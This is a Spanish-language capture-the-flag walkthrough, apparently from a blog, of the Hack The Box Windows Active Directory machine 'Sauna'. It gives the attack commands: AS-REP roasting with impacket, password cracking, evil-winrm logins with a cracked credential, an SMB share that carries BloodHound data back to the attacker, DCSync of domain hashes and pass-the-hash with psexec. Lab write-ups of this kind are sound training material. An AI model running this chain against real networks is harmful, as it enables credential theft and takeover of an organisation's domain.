---
layout: single
title: Sauna - Hack The Box
excerpt: "Sauna fue una buena oportunidad para jugar con los conceptos de Windows Active Directory empaquetados en una caja de dificultad fácil. Comenzaré usando una fuerza bruta de Kerberoast en los nombres de usuario que encontre en la pagina web, luego descubriré que uno de ellos tiene la bandera configurada para permitirme obtener su hash sin autenticarme en el dominio. Haré AS-REP Roast para obtener el hash, romperlo y obtener una shell. Encontraré las credenciales de los próximos usuarios en la clave de registro de AutoLogon. BloodHound mostrará que el usuario tiene privilegios que le permiten realizar un ataque DC Sync, que proporciona todos los hashes de dominio, incluidos los administradores, que usaré para obtener un shell."
date: 2021-07-05
classes: wide
header:
  teaser: /assets/images/Sauna/Untitled.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  -   Active Directory
  -   ASP-RESP Roasting
---

# Sauna HTB

Buenas a todos, hoy voy a estar resolviendo la maquina Sauna de HackTheBox, es una maquina Windows de dificultad facil, en ella vamos a tocar Directorio Activo.

![/assets/images/Sauna/Untitled.png](/assets/images/Sauna/Untitled.png)

# **ENUMERACIÓN CON NMAP**

Lo primero de todo como siempre será enumerar que puertos tiene abiertos la maquina, para ellos vamos a utilizar la herramienta "nmap" con la que haremos un escaneo exhaustivo de puertos.

Para hacer un "Fast Scan" de puertos, siempre suelo utilizar esta sintaxis:

`nmap -sS —min-rate 5000 -p- —open -n -Pn -vvv <IPMACHINE> -oN <FILENAME>` 

![/assets/images/Sauna/Untitled%201.png](/assets/images/Sauna/Untitled%201.png)

Yo lo exporto en formato Grep para extraer los puertos con la utilidad "extractPorts" del Youtuber/Streamer "S4vitaar".

Esta utilidad me copia los puertos en la clipboard. Os comparto el Script por aquí pero recordad dejar una estrellita en el Github de S4vitar: (solo tenéis que tener instalado xclip y pegar este código en la .bashrc o .zshrc)

[https://pastebin.com/tYpwpauW](https://pastebin.com/tYpwpauW) 

![/assets/images/Sauna/Untitled%202.png](/assets/images/Sauna/Untitled%202.png)

Ahora vamos a enumerar versiones y servicios de todos los puertos con Nmap:

`nmap -sC -sV -p<PUERTOS> <IPMACHINE> -oN <FILENAME>`

![/assets/images/Sauna/Untitled%203.png](/assets/images/Sauna/Untitled%203.png)

Vemos que nmap nos arroja un nombre de dominio llamado: EGOTISTICAL-BANK.LOCAL , vamos a añadirlo al /etc/hosts junto con sauna.htb

Después de enumerar un poco los puertos, no veo nada interesante en el puerto 445 (SAMBA) un puerto que siempre es muy importante de echarle un vistazo, pero no tenemos acceso para poder ver los recursos, así que voy a ir directamente al servicio web que corre en el puerto 80. 

![/assets/images/Sauna/Untitled%204.png](/assets/images/Sauna/Untitled%204.png)

Vemos en About Us que hay unos nombres de usuarios con los que podriamos crear posibles usuarios:

![/assets/images/Sauna/Untitled%205.png](/assets/images/Sauna/Untitled%205.png)

![/assets/images/Sauna/Untitled%206.png](/assets/images/Sauna/Untitled%206.png)

Con la utilidad GetNPUsers.py, podemos hacer un ataque ASP-RESP Roasting, intentararemos obtener algun hash:

`python3 GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -userfile users -format hashcat -outputfile hash -dc-ip 10.10.10.175`

![/assets/images/Sauna/Untitled%207.png](/assets/images/Sauna/Untitled%207.png)

Vamos a intentar crackear con john el hash:

![/assets/images/Sauna/Untitled%208.png](/assets/images/Sauna/Untitled%208.png)

Ya tenemos la contraseña del usuario `fsmith:Thestrokes23`

Vamos a intentar conectarnos al sistema con Evil-WinRM:

`evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23`

![/assets/images/Sauna/Untitled%209.png](/assets/images/Sauna/Untitled%209.png)

![/assets/images/Sauna/Untitled%2010.png](/assets/images/Sauna/Untitled%2010.png)

# **PRIV. ESCALATION ROOT**

Nos compartimos un servidor http con python con el comando :

`python3 -m http.server 80`

![/assets/images/Sauna/Untitled%2011.png](/assets/images/Sauna/Untitled%2011.png)

Pasamos el script de powershell `SharpHound.ps1` a la maquina y ejecutamos el comando :

`Invoke-BloodHound -CollectionMethod All`

![/assets/images/Sauna/Untitled%2012.png](/assets/images/Sauna/Untitled%2012.png)

Para que nos haga una recopilacion de todo el sistema y nos lo guarde en un .zip, que nos vamos a pasar a nuestra maquina, para ello compartimos una carpeta de nuestro sistema con la maquina:

`python3 smbserver.py share . -smb2support -username pwned -password password123`

![/assets/images/Sauna/Untitled%2013.png](/assets/images/Sauna/Untitled%2013.png)

Y en la maquina remota :

`net use \\IP\share /u:pwned password123`

De esta manera nos compartimos la carpeta actual y podemos copiar el .zip a nuestra maquina:

`copy <FILENAME.ZIP> \\IP\share`

![/assets/images/Sauna/Untitled%2014.png](/assets/images/Sauna/Untitled%2014.png)

Abrimos nuestro BloodHound y agregamos el .zip para ver de que forma podemos escalar privilegios:

Enumerando un poco encontramos que hay un usuario (SVC_LOANGMGR) con el que podríamos convertirnos en Domain Admins:

![/assets/images/Sauna/Untitled%2015.png](/assets/images/Sauna/Untitled%2015.png)

Vamos a enumerar un poco mas el sistema para ver si conseguimos convertirnos en ese usuario, voy a utilizar Invoke-winPEAS.ps1, me lo comparto de la misma forma que antes y ejecuto:

`Invoke-winPeas`

Y nos reporta unas credenciales de un usuario llamado svc_loanmanager: 

![/assets/images/Sauna/Untitled%2016.png](/assets/images/Sauna/Untitled%2016.png)

Vamos a intentar conectarnos a esa cuenta a traves de evil-winrm:

![/assets/images/Sauna/Untitled%2017.png](/assets/images/Sauna/Untitled%2017.png)

Si nos fijamos bien no hay ningun usuario llamado svc-loanmanager:

![/assets/images/Sauna/Untitled%2018.png](/assets/images/Sauna/Untitled%2018.png)

Vamos a intentar utilizar esas credenciales para el usuario que necesitamos svc_loanmgr:

![/assets/images/Sauna/Untitled%2019.png](/assets/images/Sauna/Untitled%2019.png)

Estamos dentro de la cuenta que necesitamos, ahora toca escalar privilegios tal y como nos muestra BloodHound:

![/assets/images/Sauna/Untitled%2020.png](/assets/images/Sauna/Untitled%2020.png)

Podemos realizar un ataque DCSync con el usuario SVC_LOANMGR, Para extraer credenciales del controlador de dominio sin ejecución de código en él podemos usar la herramienta secretsdump de impacket o con mimikatz como dice BloodHound:

![/assets/images/Sauna/Untitled%2021.png](/assets/images/Sauna/Untitled%2021.png)

Ya tenemos el hash del administrador del dominio, podemos usar la herramienta psexec de impacket para conectarnos a la maquina sin necesidad de saber su contraseña, solo con su hash es suficiente:

![/assets/images/Sauna/Untitled%2022.png](/assets/images/Sauna/Untitled%2022.png)

Espero que os haya gustado, a mi me ha encantado, las maquinas de Directorio Activo son muy divertidas de vulnerar. Hasta la próxima.